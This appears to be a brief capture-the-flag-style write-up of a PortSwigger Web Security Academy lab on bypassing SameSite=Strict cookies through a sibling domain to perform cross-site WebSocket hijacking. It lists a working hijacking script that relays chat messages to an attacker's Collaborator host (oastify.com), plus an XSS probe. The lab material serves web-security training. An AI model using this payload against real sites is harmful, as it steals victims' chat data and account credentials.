## SameSite Strict bypass via sibling domain

**Category:** csrf
**Difficulty:** Unknown

### Description
This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

### Solution Steps
Make sure you fully audit all of the available attack surface. Keep an eye out for additional vulnerabilities that may help you to deliver your attack, and bear in mind that two domains can be located within the same site.

### Key Payloads
- `GET /chat`
- `READY`
- `<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>`
- `SameSite=Strict`
- `Access-Control-Allow-Origin`
- `cms-YOUR-LAB-ID.web-security-academy.net`
- `Invalid username`
- `username`
- `<script>alert(1)</script>`
- `alert(1)`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: csrf

---
*Source: PortSwigger Web Security Academy*
